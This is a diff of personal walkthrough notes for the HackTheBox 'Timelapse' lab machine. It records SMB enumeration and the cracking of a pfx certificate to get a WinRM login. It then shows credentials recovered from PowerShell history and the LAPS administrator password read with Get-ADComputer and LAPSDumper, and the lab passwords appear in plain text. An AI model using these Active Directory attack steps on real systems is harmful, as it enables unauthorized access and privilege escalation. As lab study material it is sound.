@@ -114,21 +114,16 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 104.15 seconds
 ```
 
-
+We can have timelapse.htb dc01 or dc01.timelapse.htb as hostname
+has 5986 ssl version, so we can try to use evil winrm
 ## Domain controller
 Kerberos+LDAP+DNS+SMB -> Domaincontroller?
 
 ## Check ports
 
-### Simple DNS Plus port 53 tcp
-
-### Microsoft Windows Kerberos port 88 tcp
-
-### Microsoft Windows RPC port 135 tcp
-
-### Microsoft Windows netbios-ssn port 139 tcp
-
 ### SMB port 445 tcp
+Try crackmapexec and smbclient
+To get host name
 ```
 crackmapexec smb timelapse.htb
 [*] First time use detected
@@ -238,15 +233,12 @@ smb: \HelpDesk\> ls
 
 #### LAPS
 
-### port 464
+```
+md5sum LAPS.x64.msi
+2f80ef0699d15d788caf897a9b3ceb05  LAPS.x64.msi
+```
 
-### Microsoft Windows RPC over HTTP 1.0 port 593 tcp
-
-### port 636
-
-### Microsoft Windows Active Directory LDAP port 389, 3268 tcp
-
-### port 3269
+![[Pasted image 20230218003631.png]]
 
 
 
@@ -276,7 +268,7 @@ Session completed.
 supremelegacy is the password
 
 ## pfx file
-
+Group of certificates
 Use openssl to create pfx file?? so we can also extract private key and certificate from `.pfx` file.
 ```
 openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
@@ -455,10 +447,11 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
 ```
 
+gci -force . to show hiddenfiles
+
 
 # Privilege Escalation
 ## Enumeration
-
 ### Check legacy
 ```
 *Evil-WinRM* PS C:\Users\legacyy\Desktop> net user legacyy
@@ -505,6 +498,9 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
 ### powershell history
 
+we should check psreadline
+
+
 ```
 *Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\windows\powershell\psreadline> ls
 
@@ -517,6 +513,8 @@ Mode                LastWriteTime         Length Name
 -a----         3/3/2022  11:46 PM            434 ConsoleHost_history.txt
 
 ```
+
+
 
 ```
 *Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\windows\powershell\psreadline> type ConsoleHost_history.txt
@@ -531,5 +529,90 @@ SessionOption $so -scriptblock {whoami}
 get-aduser -filter * -properties *
 exit
 ```
+netstat command is there
 
-## 
+
+
+
+## crackmapexec
+
+### SMB
+`crackmapexec smb timelapse.htb -u svc_deploy -p`
+### winrm
+`crackmapexec winrm timelapse.htb -u svc_deploy -p`
+
+## Login as svc_deploy
+
+```
+evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
+```
+
+## Check the user
+
+```
+net user svc_deploy
+User name                    svc_deploy
+Full Name                    svc_deploy
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/25/2021 11:12:37 AM
+Password expires             Never
+Password changeable          10/26/2021 11:12:37 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   10/25/2021 11:25:53 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *LAPS_Readers         *Domain Users
+The command completed successfully.
+
+```
+LAPS_Readers
+
+## Get the password from LAPS
+`Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *`
+
+```
+Modified                             : 2/17/2023 12:17:34 PM
+modifyTimeStamp                      : 2/17/2023 12:17:34 PM
+ms-Mcs-AdmPwd                        : uB.0K7+V8;0.B}9L{jz1$j!g
+```
+
+## Get root flag
+
+Administrator and use the password from Get-ADComputer thing
+
+```
+*Evil-WinRM* PS C:\Users\TRX\Desktop> ls
+
+
+    Directory: C:\Users\TRX\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        2/17/2023  12:17 PM             34 root.txt
+
+```
+
+## LAPSDumper
+
+https://github.com/n00py/LAPSDumper/blob/main/laps.py
+
+```
+python3 laps.py -d timelapse.htb  -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
+LAPS Dumper - Running at 02-17-2023 10:12:22
+DC01 uB.0K7+V8;0.B}9L{jz1$j!g
+```
+
